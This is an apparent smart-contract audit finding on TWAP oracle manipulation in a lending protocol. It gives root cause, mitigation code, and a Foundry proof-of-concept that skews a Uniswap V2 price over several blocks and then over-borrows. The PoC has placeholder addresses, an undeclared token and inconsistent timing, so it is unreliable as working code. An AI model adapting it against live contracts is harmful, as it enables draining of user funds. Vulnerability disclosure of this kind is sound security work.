# H-01: Price manipulation via TWAP oracle allows draining lending pool

## Severity: High

## Lines of code
https://github.com/bastion-protocol/bastion-core/blob/main/contracts/Oracle.sol#L87-L112

## Vulnerability details

### Impact

An attacker can manipulate the TWAP oracle price by executing large swaps in the underlying Uniswap V2 pool across multiple blocks, then drain the lending pool by borrowing against the inflated collateral price. The attack is economically viable with a flash loan for the swap capital.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../interfaces/ILendingPool.sol";
import "../interfaces/IUniswapV2Pair.sol";

contract TWAPManipulationTest is Test {
    ILendingPool pool = ILendingPool(0x...);
    IUniswapV2Pair pair = IUniswapV2Pair(0x...);

    function testTWAPManipulation() public {
        // 1. Fork mainnet
        vm.createSelectFork(vm.envString("MAINNET_RPC"), 17_000_000);

        // 2. Accumulate TWAP manipulation over 30 blocks
        for (uint i = 0; i < 30; i++) {
            // Swap large amount to skew price
            pair.swap(1_000_000e18, 0, address(this), "");
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 12);
        }

        // 3. Borrow against manipulated price
        pool.borrow(address(token), 5_000_000e18, address(this));

        // 4. Profit: borrowed more than collateral worth
        assertGt(token.balanceOf(address(this)), 4_000_000e18);
    }
}
```

### Root cause

The `getPrice()` function in `Oracle.sol` uses a TWAP window of only 30 minutes (150 blocks at 12s/block), which is insufficient to prevent manipulation. An attacker with sufficient capital can skew the TWAP over this window and then exploit the lending pool.

```solidity
// Oracle.sol line 87
function getPrice(address token) external view returns (uint256) {
    // VULNERABILITY: 30-minute TWAP window is too short
    (uint price0Cumulative, uint price1Cumulative, uint32 blockTimestamp) =
        UniswapV2OracleLibrary.currentCumulativePrices(pair);
    uint32 timeElapsed = blockTimestamp - blockTimestampLast;
    require(timeElapsed >= MIN_PERIOD, "TWAP: insufficient time elapsed");
    // MIN_PERIOD = 1800 seconds (30 min) -- too short for mainnet
    uint224 price = uint224((price0Cumulative - price0CumulativeLast) / timeElapsed);
    return uint256(price);
}
```

### Recommended Mitigation

1. Increase the TWAP window to at least 2 hours (7200 seconds).
2. Add a circuit breaker: if spot price deviates more than 5% from TWAP, revert.
3. Consider using Chainlink as a fallback oracle when TWAP is unavailable.

```solidity
uint32 constant MIN_PERIOD = 7200; // 2 hours instead of 30 minutes
uint256 constant MAX_DEVIATION = 500; // 5% in basis points

function getPrice(address token) external view returns (uint256) {
    uint224 twapPrice = _computeTWAP();
    uint256 spotPrice = _getSpotPrice();
    require(
        _deviation(twapPrice, spotPrice) <= MAX_DEVIATION,
        "Oracle: price deviation too high"
    );
    return uint256(twapPrice);
}
```

## Tools used
Manual review, Foundry fork test

## Assessed type
Oracle Manipulation
